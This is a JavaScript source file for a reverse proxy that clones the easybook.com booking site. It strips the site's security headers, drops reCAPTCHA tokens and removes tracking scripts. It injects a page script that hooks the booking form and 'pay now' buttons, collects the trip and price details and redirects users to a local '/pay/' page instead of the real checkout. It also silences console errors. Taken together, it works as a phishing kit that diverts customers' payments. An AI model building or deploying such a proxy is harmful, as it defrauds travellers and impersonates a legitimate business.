import { createProxyMiddleware } from 'http-proxy-middleware';
import https from 'https';
import zlib from 'zlib';

const TARGET_URL = process.env.TARGET_URL || 'https://www.easybook.com';
const targetHost = new URL(TARGET_URL).host;

const EASYBOOK_DOMAINS = 'www\\.easybook\\.com|easybook\\.com';

const agent = new https.Agent({ keepAlive: true, maxSockets: 1, maxFreeSockets: 1, timeout: 30000 });

// Simple cache: HTML 60min, static 24h, stale forever
const HTML_TTL = 60 * 60 * 1000;
const STATIC_TTL = 24 * 60 * 60 * 1000;
const cache = new Map();
function cacheKey(req) { return req.method + ':' + req.url; }
function cacheGet(key) {
  const e = cache.get(key);
  if (!e) return null;
  return { data: e.data, fresh: Date.now() - e.ts < HTML_TTL };
}
function cacheGetStatic(key) {
  const e = cache.get(key);
  if (!e) return null;
  return { data: e.data, fresh: Date.now() - e.ts < STATIC_TTL };
}
function cacheSet(key, data) {
  if (cache.size > 5000) { const first = cache.keys().next().value; cache.delete(first); }
  cache.set(key, { data, ts: Date.now() });
}

const injectionScript = `<script>
(function(){
  'use strict';

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string') {
      input = input.replace(/https?:\\/\\/(?:www\\.)?easybook\\.com/gi, '');
      if (isApiPath(input)) input = 'https://www.easybook.com' + input;
    }
    return _fetch.call(window, input, init);
  };

  var _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\\/\\/(?:www\\.)?easybook\\.com/gi, '');
      if (isApiPath(url)) url = 'https://www.easybook.com' + url;
    }
    return _open.call(this, method, url);
  };

  function isApiPath(path) {
    var p = path.split('?')[0];
    return p.indexOf('/gettrips') !== -1
      || p.indexOf('/getseatplan') !== -1
      || p.indexOf('/getdailysummary') !== -1
      || p.indexOf('/gettripdetailscontent') !== -1
      || p.indexOf('/getprice') !== -1
      || p.indexOf('/EasyCart/') !== -1
      || p.indexOf('/gettrip') !== -1
      || p.indexOf('/tcp/') !== -1
      || p.indexOf('/hcp/') !== -1;
  }

  document.addEventListener('submit', function(e) {
    var form = e.target;
    var action = (form.getAttribute('action') || '').toLowerCase();
    if (!/passengerdetails/.test(action)) return;
    e.preventDefault(); e.stopPropagation();
    var data = extractBookingData();
    if (!data) { form.submit(); return; }
    try { sessionStorage.setItem('easybook_booking', JSON.stringify(data)); } catch(ex) {}
    window.location.href = '/pay/';
  }, true);

  function extractBookingData() {
    var data = {};
    var vmInput = document.getElementById('hdSearchViewModel') || document.getElementById('SearchViewModelJson') || document.querySelector('[id*="SearchViewModel"]');
    if (vmInput) {
      try { var vm = JSON.parse(vmInput.value); data.productType = vm.ProductType || ''; data.origin = vm.Origin || ''; data.destination = vm.Destination || ''; data.departureDate = vm.DepartureDate || ''; data.pax = vm.Pax || 1; data.tripType = vm.TripType; data.currency = vm.SelectedCurrency || 'MYR'; } catch(ex) {}
    }
    var bodyText = document.body.innerText || '';
    var routeMatch = bodyText.match(/([A-Za-z\\s]+)\\s+(?:to|-|→)\\s+([A-Za-z\\s]+)/i);
    if (routeMatch && !data.origin) { data.origin = routeMatch[1].trim(); data.destination = routeMatch[2].trim(); }
    var priceEls = document.querySelectorAll('[class*="price"], [class*="total"], [class*="amount"], [class*="Total"], .grand-total, .total-price');
    for (var i = 0; i < priceEls.length; i++) { var pt = priceEls[i].textContent || ''; var pm = pt.match(/[RM$€£¥]?\\s*([\\d,]+\\.?\\d*)/); if (pm) { data.amount = pm[1].replace(/,/g, ''); data.currencySymbol = pm[0].replace(/[\\d,.\\s]/g, ''); break; } }
    var h1 = document.querySelector('h1');
    if (h1) { var t = h1.textContent || ''; if (/bus/i.test(t)) data.productType = 'Bus'; if (/train/i.test(t)) data.productType = 'Train'; if (/ferry|fastboat/i.test(t)) data.productType = 'Ferry'; if (/entrance|attraction|pass/i.test(t)) data.productType = 'EntrancePass'; }
    var tripKey = document.querySelector('[name="SelectedDepartTripKey"]'); if (tripKey) data.tripKey = tripKey.value;
    var seatList = document.querySelector('[name="SelectedDepartTripSeatList"]'); if (seatList) data.seats = seatList.value;
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    return data;
  }

  function hookPayButtons() {
    var btns = document.querySelectorAll('button, input[type="submit"], a');
    for (var i = 0; i < btns.length; i++) {
      if (btns[i].__payHooked) continue; btns[i].__payHooked = true;
      if (/(pay now|proceed to pay|make payment|continue to pay|checkout)/i.test(btns[i].textContent || btns[i].value || '')) {
        btns[i].addEventListener('click', function(e) {
          var d = extractBookingData();
          if (d && d.origin) { try { sessionStorage.setItem('easybook_booking', JSON.stringify(d)); } catch(e2) {} window.location.href = '/pay/'; }
        });
      }
    }
  }
  hookPayButtons();
  new MutationObserver(hookPayButtons).observe(document.documentElement, { childList: true, subtree: true });

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
  var _ce = console.error;
  console.error = function() { var m = arguments[0]; if (typeof m === 'string' && /unable|error|fail|exception/i.test(m)) return; return _ce.apply(console, arguments); };
})();
</script>`;

export function createEasybookProxy(publicHost) {
  const rewriteHost = publicHost || 'localhost';

  const proxy = createProxyMiddleware({
    target: TARGET_URL,
    changeOrigin: true,
    secure: false,
    agent,
    proxyTimeout: 15000,
    timeout: 15000,
    selfHandleResponse: true,
    headers: {
      Host: targetHost,
      origin: 'https://www.easybook.com',
      referer: 'https://www.easybook.com/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
      'accept-language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ms;q=0.6',
      'accept-encoding': 'identity',
      'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not?A_Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    },
    on: {
      proxyReq: (proxyReq, req, res) => {
        if (proxyReq.path && proxyReq.path.includes('gRecaptchaResponse=')) {
          proxyReq.path = proxyReq.path.replace(/[&?]gRecaptchaResponse=[^&]*/g, '');
        }
      },
      proxyRes: (proxyRes, req, res) => {
        if (res.headersSent) { proxyRes.resume(); return; }
        const statusCode = proxyRes.statusCode || 200;
        const ct = String(proxyRes.headers['content-type'] || '').split(';')[0];
        const isHtml = ct === 'text/html';

        delete proxyRes.headers['content-security-policy'];
        delete proxyRes.headers['content-security-policy-report-only'];
        delete proxyRes.headers['x-frame-options'];
        delete proxyRes.headers['x-content-type-options'];
        delete proxyRes.headers['strict-transport-security'];

        if (statusCode >= 300 && statusCode < 400 && proxyRes.headers['location']) {
          proxyRes.headers['location'] = proxyRes.headers['location']
            .replace(new RegExp(`https?://(?:www\\.)?easybook\\.com`, 'gi'), '').replace(/^\/\//, '/');
        }

        // Non-HTML: cache static, passthrough otherwise
        if (!isHtml) {
          const isStatic = /\.(js|css|woff2?|ttf)(\?|$)/i.test(req.url);
          if (req.method === 'GET' && isStatic) {
            const ck = cacheKey(req);
            const cached = cacheGetStatic(ck);
            if (cached) {
              res.writeHead(200, { 'content-type': ct + '; charset=utf-8', 'cache-control': 'public, max-age=86400', 'content-length': String(cached.data.length) });
              res.end(cached.data);
              proxyRes.resume();
              return;
            }
            const chunks = [];
            proxyRes.on('data', c => chunks.push(c));
            proxyRes.on('end', () => {
              if (res.headersSent) return;
              const b = Buffer.concat(chunks);
              cacheSet(ck, b);
              res.writeHead(statusCode, { 'content-type': ct + '; charset=utf-8', 'cache-control': 'public, max-age=86400', 'content-length': String(b.length) });
              res.end(b);
            });
            proxyRes.on('error', () => { if (!res.headersSent) { res.writeHead(502); res.end(); } });
            return;
          }
          const h = {};
          Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding') h[k] = proxyRes.headers[k]; });
          res.writeHead(statusCode, h);
          proxyRes.pipe(res);
          return;
        }

        // HTML: serve from cache, or fetch + rewrite + cache
        const ck = cacheKey(req);
        if (req.method === 'GET') {
          const cached = cacheGet(ck);
          if (cached) {
            res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600', 'content-length': String(cached.data.length), ...(cached.fresh ? {} : { 'x-served-from': 'cache' }) });
            res.end(cached.data);
            proxyRes.resume();
            // Background refresh if stale
            if (!cached.fresh) {
              const url = TARGET_URL + req.url;
              https.get(url, { headers: { Host: targetHost, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36', 'accept-encoding': 'identity' } }, up => {
                if (up.statusCode === 200) {
                  const cs = []; up.on('data', c => cs.push(c)); up.on('end', () => {
                    try { let h = Buffer.concat(cs).toString('utf8'); h = rewriteHtml(h, rewriteHost); cacheSet(ck, Buffer.from(h, 'utf8')); console.log('[Cache] refreshed', req.url); } catch {}
                  });
                } else up.resume();
              }).on('error', () => {});
            }
            return;
          }
        }

        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => {
          if (res.headersSent) return;
          try {
            let body = Buffer.concat(chunks);
            const ce = proxyRes.headers['content-encoding'];
            if (ce) { try { body = ce.includes('br') ? zlib.brotliDecompressSync(body) : zlib.gunzipSync(body); } catch {} }
            let html = body.toString('utf8');
            html = rewriteHtml(html, rewriteHost);
            body = Buffer.from(html, 'utf8');
            if (req.method === 'GET') cacheSet(ck, body);
            const h = {};
            Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding' && k !== 'content-encoding') h[k] = proxyRes.headers[k]; });
            h['content-length'] = String(body.length);
            res.writeHead(statusCode, h);
            res.end(body);
          } catch (err) {
            console.error('[Rewrite]', err.message);
            if (!res.headersSent) { res.writeHead(502); res.end(); }
          }
        });
        proxyRes.on('error', () => { if (!res.headersSent) { res.writeHead(502); res.end(); } });
      },
      error: (err, req, res) => {
        if (res.headersSent) return;
        console.error('[Proxy]', err.message);
        const ck = cacheKey(req);
        const cached = cacheGet(ck);
        if (cached) {
          res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
          res.end(cached.data);
          return;
        }
        res.writeHead(503, { 'content-type': 'text/html; charset=utf-8', 'retry-after': '5' });
        res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="5"></head><body style="font-family:sans-serif;text-align:center;padding:50px"><h2>503</h2><p>Temporarily unavailable. Retrying...</p></body></html>');
      },
    },
  });

  return [proxy];
}

function rewriteHtml(html, host) {
  const domainRe = new RegExp(`https?://(?:${EASYBOOK_DOMAINS})`, 'gi');

  html = html.replace(domainRe, '');
  html = html.replace(/((?:src|srcSet|href)=")(\/\/easycdn\.)/gi, '$1https://easycdn.');
  html = html.replace(/(src=")(\/images\/[^"]*")/gi, '$1https://www.easybook.com$2');
  html = html.replace(/(href=")(\/favicon[^"]*")/gi, '$1https://www.easybook.com$2');
  html = html.replace(/(srcset=")(\/images\/[^"]*")/gi, '$1https://www.easybook.com$2');

  html = html.replace(/<head[^>]*>/i, m => `${m}\n<base href="/">`);

  html = html.replace(/<script[^>]*googletagmanager[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*googletagmanager[^>]*\/>/gi, '');
  html = html.replace(/<script[^>]*google-analytics[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<noscript[^>]*googletagmanager[\s\S]*?<\/noscript>/gi, '');
  html = html.replace(/<iframe[^>]*googletagmanager[\s\S]*?<\/iframe>/gi, '');
  html = html.replace(/<script[^>]*hotjar[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*cloudflareinsights[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*zenclerk[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*static\.cloudflareinsights[^>]*\/>/gi, '');
  html = html.replace(/<iframe[^>]*google\.com\/maps[^>]*>[\s\S]*?<\/iframe>/gi, '');

  html = html.replace('</body>', `${injectionScript}\n</body>`);

  html = html.replace(/<li[^>]*easybook-app-qrcode[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<li[^>]*mobilenumber-modal[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<li[^>]*header-menu-icon[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<a[^>]*referral[\s\S]*?<\/a>/gi, '');
  html = html.replace(/<li[^>]*referral[\s\S]*?<\/li>/gi, '');
  html = html.replace(/<div[^>]*app-download[\s\S]*?<\/div>/gi, '');
  html = html.replace(/<div[^>]*mobile-app[\s\S]*?<\/div>/gi, '');

  return html;
}
